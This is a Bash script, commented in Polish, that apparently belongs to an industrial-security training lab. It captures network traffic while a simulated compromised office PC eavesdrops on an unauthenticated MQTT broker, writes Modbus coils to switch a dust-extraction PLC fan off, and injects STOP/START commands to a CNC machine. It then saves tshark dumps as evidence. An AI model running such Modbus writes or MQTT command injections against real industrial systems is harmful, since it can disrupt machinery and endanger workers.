#!/usr/bin/env bash
# Analiza ruchu labu v0 (T08). Nagrywa obie sieci od startu labu, z przejętego komputera biurowego (biuro-pc)
# wykonuje scenariusz ataku i zapisuje do evidence/etap-3/ nagrania, zrzuty tshark (te same dekodery
# protokołów co Wireshark), konsolę atakującego i logi labu. Opis plików: evidence/etap-3/README.md.
#
# Scenariusz w sekundach od startu labu; stacja CAD w tym czasie wysyła G-code jawnym HTTP
# na cnc-1 (ok. 0 s i 60 s) i cnc-2 (ok. 30 s i 90 s):
#   40 s  podsłuch: anonimowa subskrypcja wszystkich tematów brokera w chmurze,
#   45 s  Modbus: odczyt rejestrów i cewek PLC odpylania, wyłączenie wentylatora i po 5 s ponowne włączenie,
#   68 s  wstrzyknięcie komendy STOP dla cnc-1 (w trakcie programu), 78 s komenda START.
#
# Uruchomienie: make v0-analiza. Lab v0 musi być wyłączony (make v0-down); po analizie skrypt go zatrzymuje.
set -euo pipefail
cd "$(dirname "$0")/.."

V0=(docker compose -f lab/v0/compose.yaml --profile atak)
BIURO=("${V0[@]}" exec -T biuro-pc)
OUT=evidence/etap-3
CZAS=110 # długość nagrania [s]
TSHARK=(docker run --rm --network none -v "$PWD/$OUT:/cap:ro" --entrypoint tshark wood-tech/atakujacy:dev
  -n -o mqtt.show_msg_as_text:TRUE)
KONSOLA=$OUT/konsola-biuro-pc.txt

if [ -n "$("${V0[@]}" ps -q)" ]; then
  echo "lab v0 działa: najpierw make v0-down" >&2
  exit 1
fi

# Polecenie z biura: zapis do konsoli atakującego razem z wynikiem.
biuro() {
  local slowa=() a
  for a in "$@"; do
    if [[ $a =~ ^[A-Za-z0-9_./:=@-]+$ ]]; then slowa+=("$a"); else slowa+=("'$a'"); fi
  done
  echo "biuro-pc\$ ${slowa[*]}" >>"$KONSOLA"
  "${BIURO[@]}" "$@" >>"$KONSOLA" 2>&1
  echo >>"$KONSOLA"
}

# Czeka do podanej sekundy od startu labu.
do_sekundy() {
  local reszta=$(($1 - $(date +%s) + START))
  if [ "$reszta" -gt 0 ]; then sleep "$reszta"; fi
  echo "[$1 s] $2"
}

mkdir -p "$OUT"
rm -f "$OUT"/*.pcap "$OUT"/zrzut-*.txt "$KONSOLA" "$OUT/logi-labu.txt"
"${V0[@]}" up --no-start --build
for siec in zaklad internet; do
  docker run -d --rm --name "wt-analiza-$siec" --net host --cap-add NET_RAW --cap-add NET_ADMIN \
    -v "$PWD/$OUT:/cap" --entrypoint timeout wood-tech/router:dev "$CZAS" \
    tcpdump -i "wt0-$siec" -nn -U -w "/cap/v0-$siec.pcap" >/dev/null
done
sleep 2
"${V0[@]}" up -d
START=$(date +%s)
echo "nagrywanie $CZAS s do $OUT/v0-zaklad.pcap i $OUT/v0-internet.pcap"

do_sekundy 40 "podsłuch: anonimowa subskrypcja wszystkich tematów"
biuro mosquitto_sub -h mqtt.chmura.example -t '#' -v -C 6 -W 10

do_sekundy 45 "Modbus: odczyt PLC, wyłączenie i włączenie wentylatora"
biuro python3 -c "
import time
from pymodbus.client import ModbusTcpClient
plc = ModbusTcpClient('plc-odpylanie', port=502, timeout=3)
assert plc.connect()
print('rejestry 0-2 (obroty rpm, podcisnienie Pa, pyl mg/m3*10):', plc.read_holding_registers(0, count=3).registers)
print('cewki 0-1 (wentylator, przepustnica):', plc.read_coils(0, count=2).bits[:2])
plc.write_coil(0, False)
print('zapis cewki 0 = 0: wentylator wylaczony')
time.sleep(5)
print('rejestry po 5 s:', plc.read_holding_registers(0, count=3).registers)
plc.write_coil(0, True)
print('zapis cewki 0 = 1: wentylator wlaczony')
plc.close()
"

do_sekundy 68 "wstrzyknięcie komendy STOP dla cnc-1"
biuro mosquitto_pub -h mqtt.chmura.example -t wood-tech/hala1/cnc-1/komenda -m STOP -d
do_sekundy 78 "komenda START dla cnc-1"
biuro mosquitto_pub -h mqtt.chmura.example -t wood-tech/hala1/cnc-1/komenda -m START -d

docker wait wt-analiza-zaklad wt-analiza-internet >/dev/null
# Logi labu z tego czasu, w kolejności znaczników czasu Dockera.
"${V0[@]}" logs --no-color --timestamps cad-stacja cnc-1 plc-odpylanie chmura-mqtt 2>/dev/null |
  grep -E 'program_wyslany|program_wczytany|komenda_mqtt|zmiana_cewek|New client connected' |
  sort -t '|' -k2,2 >"$OUT/logi-labu.txt"
"${V0[@]}" down

echo "zrzuty tshark"
# Nagłówek zrzutu: skąd pochodzi i jakim filtrem Wiresharka go odtworzyć.
naglowek() {
  printf '# %s\n# Nagranie: %s, filtr Wiresharka: %s\n# Zrzut z tshark (dekodery Wiresharka), opis w README.md.\n\n' "$1" "$2" "$3"
}
# Lista ramek pasujących do filtra (jak w oknie Wiresharka), najwyżej $3 pierwszych.
lista() {
  "${TSHARK[@]}" -r "/cap/$1" -Y "$2" 2>/dev/null | sed -n "1,${3}p"
}
# Pierwsza ramka pasująca do filtra: szczegóły protokołów z $3 i bajty ramki (dolny panel Wiresharka).
szczegoly() {
  local nr
  nr=$("${TSHARK[@]}" -r "/cap/$1" -Y "$2" -T fields -e frame.number 2>/dev/null | sed -n 1p)
  [ -n "$nr" ] || { echo "brak ramki dla filtra: $2" >&2; return 1; }
  "${TSHARK[@]}" -r "/cap/$1" -Y "frame.number == $nr" -V -x -O "$3" 2>/dev/null
}

filtr='mqtt.topic contains "cnc-1/telemetria"'
{
  naglowek "Zrzut 1: telemetria wrzeciona cnc-1 w internecie" v0-internet.pcap "$filtr"
  lista v0-internet.pcap "$filtr" 5
  echo
  szczegoly v0-internet.pcap "$filtr && frame contains \"\\\"pracuje\\\": true\"" mqtt
} >"$OUT/zrzut-1-telemetria-mqtt.txt"

filtr='http.request.method == "POST" && ip.dst == 10.10.0.11'
strumien=$("${TSHARK[@]}" -r /cap/v0-zaklad.pcap -Y "$filtr" -T fields -e tcp.stream 2>/dev/null | sed -n 1p)
{
  naglowek "Zrzut 2: G-code wysłany ze stacji CAD na cnc-1 jawnym HTTP" v0-zaklad.pcap "$filtr"
  lista v0-zaklad.pcap "$filtr" 10
  echo
  "${TSHARK[@]}" -r /cap/v0-zaklad.pcap -q -z "follow,tcp,ascii,$strumien" 2>/dev/null
} >"$OUT/zrzut-2-gcode-http.txt"

filtr='modbus'
{
  naglowek "Zrzut 3: Modbus TCP z biura do PLC odpylania" v0-zaklad.pcap "$filtr"
  lista v0-zaklad.pcap "$filtr" 50
  echo
  szczegoly v0-zaklad.pcap 'modbus.func_code == 5 && ip.src == 10.10.0.66' mbtcp,modbus
} >"$OUT/zrzut-3-modbus.txt"

filtr='mqtt.topic contains "cnc-1/komenda"'
{
  naglowek "Zrzut 4: wstrzyknięcie komend STOP i START dla cnc-1 z biura" v0-zaklad.pcap "$filtr"
  lista v0-zaklad.pcap "$filtr" 20
  echo
  szczegoly v0-zaklad.pcap "$filtr && ip.src == 10.10.0.66 && mqtt.msgtype == 3" mqtt
} >"$OUT/zrzut-4-wstrzykniecie-mqtt.txt"

filtr='ip.addr == 10.10.0.66 && (mqtt.msgtype == 1 || mqtt.msgtype == 8)'
{
  naglowek "Zrzut 5: biuro łączy się z brokerem bez hasła i subskrybuje wszystkie tematy" v0-zaklad.pcap "$filtr"
  lista v0-zaklad.pcap "$filtr" 20
  echo
  szczegoly v0-zaklad.pcap "$filtr && mqtt.msgtype == 1" mqtt
  echo
  szczegoly v0-zaklad.pcap "$filtr && mqtt.msgtype == 8" mqtt
} >"$OUT/zrzut-5-podsluch-mqtt.txt"

ls -l "$OUT"
